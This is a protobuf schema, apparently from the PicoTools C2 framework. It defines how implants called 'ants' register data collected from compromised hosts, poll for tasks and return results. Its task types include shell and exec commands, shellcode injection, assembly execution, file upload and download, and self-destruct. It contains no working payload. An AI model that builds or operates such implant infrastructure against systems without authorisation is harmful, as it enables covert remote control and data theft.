syntax = "proto3";

package listener.v1;

import "google/protobuf/wrappers.proto";
import "common/v1/common.proto";

option go_package = "github.com/PicoTools/pico-shared/proto/gen/listener/v1;listenerv1";

service ListenerService {
  // Update listener's information. Can be used to set location and meta infromation
  // of where listener works
  rpc UpdateListener( UpdateListenerRequest ) returns ( UpdateListenerResponse );

  // Register new ant with collected information from compromised OS
  rpc RegisterAnt( RegisterAntRequest ) returns ( RegisterAntResponse );

  // Get task for ant from queue
  rpc GetTask( GetTaskRequest ) returns ( GetTaskResponse );

  // Save task's results
  rpc PutResult( PutResultRequest ) returns ( PutResultResponse );
}


// --> UpdateListener
message UpdateListenerRequest {
  // Name of listener. Can be string with maximum length of 256
  google.protobuf.StringValue name = 1;
  // IP address which used to serving ant's server
  google.protobuf.StringValue ip = 2;
  // Port which used to serving ant's server
  google.protobuf.UInt32Value port = 3;
}
message UpdateListenerResponse {}
// <-- UpdateListener


// --> RegisterAnt
message RegisterAntRequest {
  // [MANDATORY] Ant's id which must be generated by itself on start
  uint32 id = 1;
  // External IP address of ant
  google.protobuf.StringValue ext_ip = 2;
  // Internal IP address of ant
  google.protobuf.StringValue int_ip = 3;
  // [MANDATORY] Operating system type
  uint32 os = 4;
  // Operating system meta information (for example kernel version)
  google.protobuf.StringValue os_meta = 5;
  // Hostname of compromised target
  google.protobuf.StringValue hostname = 6;
  // Username under which ant's process is working
  google.protobuf.StringValue username = 7;
  // Domain name of compromised target
  google.protobuf.StringValue domain = 8;
  // Is process privilged (root, high intergity, etc)
  google.protobuf.BoolValue privileged = 9;
  // Name of ant's process
  google.protobuf.StringValue proc_name = 10;
  // Ant's process ID
  google.protobuf.UInt64Value pid = 11;
  // [MANDATORY] Process architecture
  uint32 arch = 12;
  // [MANDATORY] Sleep value of ant's process (in seconds)
  uint32 sleep = 13;
  // [MANDATORY] Jitter value of ant's process (in range 1-99)
  uint32 jitter = 14;
  // [MANDATORY] Binary mask represented supported ant's capabilities
  uint32 caps = 15;
}
message RegisterAntResponse {}
// <-- RegisterAnt


// --> GetTask
message GetTaskRequest {
  // [MANDATORY] Ant's ID
  uint32 id = 1;
}
message GetTaskResponse {
  // [MANDATORY] Task ID. Generated by server and must be presents
  // to save task's output results
  int64 id = 1;
  // [MANDATORY] Capability value
  uint32 cap = 2;
  // [MANDATORY] Capability's task body
  oneof body {
    common.v1.CapSleep sleep = 3;
    common.v1.CapLs ls = 4;
    common.v1.CapPwd pwd = 5;
    common.v1.CapCd cd = 6;
    common.v1.CapWhoami whoami = 7;
    common.v1.CapPs ps = 8;
    common.v1.CapCat cat = 9;
    common.v1.CapExec exec = 10;
    common.v1.CapCp cp = 11;
    common.v1.CapJobs jobs = 12;
    common.v1.CapJobkill jobkill = 13;
    common.v1.CapKill kill = 14;
    common.v1.CapMv mv = 15;
    common.v1.CapMkdir mkdir = 16;
    common.v1.CapRm rm = 17;
    common.v1.CapExecAssembly exec_assembly = 18;
    common.v1.CapShellcodeInjection shellcode_injection = 19;
    common.v1.CapDownload download = 20;
    common.v1.CapUpload upload = 21;
    common.v1.CapPause pause = 22;
    common.v1.CapDestruct destruct = 23;
    common.v1.CapExecDetach exec_detach = 24;
    common.v1.CapShell shell = 25;
    common.v1.CapPpid ppid = 26;
    common.v1.CapExit exit = 27;
  };
}
// <-- GetTask


// --> PutResult
message PutResultRequest {
  // [MANDATORY] Ant's ID
  uint32 id = 1;
  // [MANDATORY] Tasks's ID
  int64 tid = 2;
  // Binary output of task's result
  google.protobuf.BytesValue output = 3;
  // [MANDATORY] Tasks's status. May be "IN PROGRESS" in case of long-living task
  uint32 status = 4;
}
message PutResultResponse {}
// <-- PutResult
